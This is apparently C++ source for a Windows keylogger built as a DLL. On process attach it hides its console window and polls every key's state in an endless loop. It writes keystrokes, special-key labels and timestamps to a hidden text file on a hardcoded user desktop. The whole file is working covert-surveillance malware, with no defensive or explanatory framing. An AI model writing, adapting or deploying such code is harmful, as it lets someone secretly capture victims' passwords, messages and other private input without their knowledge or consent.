#include <windows.h>																	// To work with Windows API
#include <winuser.h>

#include <iostream>		// To work with input
#include <direct.h>		// To work with files
#include <TlHelp32.h>	// General Functions to help us 

#include <sstream>
#include <fstream>

#include <cstdio>
#include <ctime>

#include <stdio.h>
#include <stdlib.h>

//using namespace std;

bool fexists(const char *filename)
{
	std::ifstream ifile(filename);
	return (bool)ifile;
}

int Save(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	std::ofstream outfile;
	outfile.open(file, std::ios_base::app);

	std::cout << key_stroke << std::endl;

	/*if (fexists(file))
	{
		size_t size = strlen(file) + 1;
		wchar_t* fileName = new wchar_t[size];
		size_t outSize;
		mbstowcs_s(&outSize, fileName, size, file, size - 1);
		MessageBox(0, fileName, L"You Fucked Up", MB_OK);
		MessageBox(0, L"The File Was found", L"You Fucked Up", MB_OK);
	}
	else
	{
		size_t size = strlen(file) + 1;
		wchar_t* fileName = new wchar_t[size];
		size_t outSize;
		mbstowcs_s(&outSize, fileName, size, file, size - 1);
		MessageBox(0, fileName, L"You Fucked Up", MB_OK);
		MessageBox(0, L"The File Didnt Exists", L"You Fucked Up", MB_OK);
	}*/
	if (key_stroke == -1)			//My code for the timer
	{
		time_t result = time(NULL);
		char str[26];
		ctime_s(str, sizeof str, &result);
		outfile << " " << str << "\n";
	}
	else if (key_stroke == 8)
		outfile << "[BACKSPACE]";
	else if (key_stroke == 13)
		outfile << "[ENTER]";
	else if (key_stroke == 32)
		outfile << " ";
	else if (key_stroke == VK_TAB)
		outfile << "[TAB]";
	else if (key_stroke == VK_SHIFT)
		outfile << "[SHIFT]";
	else if (key_stroke == VK_CONTROL)
		outfile << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		outfile << "[ESCAPE]";
	else if (key_stroke == VK_END)
		outfile << "[END]";
	else if (key_stroke == VK_HOME)
		outfile << "[HOME]";
	else if (key_stroke == VK_LEFT)
		outfile << "[LEFT]";
	else if (key_stroke == VK_UP)
		outfile << "[UP]";
	else if (key_stroke == VK_RIGHT)
		outfile << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		outfile << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		outfile << ".";
	else if(key_stroke >= 48 && key_stroke <= 90)
	{
		char back='!';
		back = MapVirtualKey(key_stroke, 2);
		outfile << back;
	}

	outfile.close();
	return 0;
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

char* GetCurrentDir()							// Return the directory of where the application is find
{
	char* szRet = (char*)malloc(MAX_PATH);		// MAX_PATH , Maximum length of full path
	_getcwd(szRet, MAX_PATH);					// Gets the current working directory. 
	return szRet;
}

BOOL WINAPI DllMain(HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)				// BOOL WINAPI DllMain: An optional entry point into a dynamic-link library (DLL). When the system starts or terminates a process or thread, it calls the entry-point function for each loaded DLL using the first thread of the process. The system also calls the entry-point function for a DLL when it is loaded or unloaded using the LoadLibrary and FreeLibrary functions.
{
	Stealth();
	char i;

	std::clock_t start;
	double duration;
	bool ifDown = true;

	char* szDllPath = (char*)malloc(MAX_PATH);
	szDllPath = GetCurrentDir();
	strcat_s(szDllPath, MAX_PATH, "\\");
	strcat_s(szDllPath, MAX_PATH, "hide.txt");

	const char *printDllPath = szDllPath;							//change the varible name
	size_t size = strlen(printDllPath) + 1;
	wchar_t* printDllPathName = new wchar_t[size];
	size_t outSize;
	mbstowcs_s(&outSize, printDllPathName, size, printDllPath, size - 1);

	start = std::clock();

	if (fdwReason == DLL_PROCESS_ATTACH)											
	{
		//MessageBox(0, printDllPathName , L"You Fucked Up" , MB_OK);
		while (1)
		{
			for (i = 8; i <= 192; i++)
			{
				duration = (std::clock() - start) / (double)CLOCKS_PER_SEC;
				if (duration > 10 && ifDown == false)
				{
					Save(-1, "C:\\Users\\avi.ma\\Desktop\\hide.txt");
					ifDown = true;
				}
				if (GetAsyncKeyState(i) == -32767)
				{
					/*std::string s = std::to_string(i);
					const char *printPath = s.c_str();							//change the varible name
					size_t size = strlen(printPath) + 1;
					wchar_t* printPathName = new wchar_t[size];
					size_t outSize;
					mbstowcs_s(&outSize, printPathName, size, printPath, size - 1);
					MessageBox(0, printPathName, L"You Fucked Up", MB_OK);*/

					Save(i,"C:\\Users\\avi.ma\\Desktop\\hide.txt");
					start = std::clock();
					ifDown = false;
				}
			}
		}
		system("PAUSE");
	}
	return TRUE;
}



